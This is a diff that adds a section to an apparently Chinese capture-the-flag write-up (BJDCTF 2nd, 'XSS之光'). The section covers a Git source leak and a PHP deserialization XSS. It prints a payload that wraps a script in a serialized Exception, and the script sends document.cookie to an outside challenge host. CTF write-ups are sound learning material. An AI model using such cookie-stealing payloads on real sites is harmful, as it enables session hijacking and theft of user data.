@@ -134,6 +134,16 @@
 <p>再开环境做了一遍得到flag</p>
 <a href="/2020/03/21/BJDCTF-2nd-wp/19.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/19.png" src="/img/loading.gif" class="lazyload"></a>
 
+<h3 id="XSS之光"><a href="#XSS之光" class="headerlink" title="XSS之光"></a>XSS之光</h3><p>Git源码泄露，反序列化，xss</p>
+<p>开局  gungungun  老祖安人了，查看源码啥也没有，扫一下目录，发现Git泄露</p>
+<a href="/2020/03/21/BJDCTF-2nd-wp/23.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/23.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>提示有xss漏洞，利用php原生类构造payload</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = serialize(<span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"&lt;script&gt;window.location.href='http://b9c4633b-9ce6-4937-8b9f-a1b02de9a086.node3.buuoj.cn/'+document.cookie&lt;/script&gt;"</span>));</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></div>
+
+<a href="/2020/03/21/BJDCTF-2nd-wp/24.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/24.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>在cookie中得到url编码的flag，解码后得到flag</p>
 <p>&nbsp;</p>
 <p>这是新生赛？？让我深刻地认识到自己连新生都不如了。（我感觉BJD 1st 也不简单</p>
 <p>慢慢来吧，转转型，misc是兴趣，web是饭碗（hhh</p>
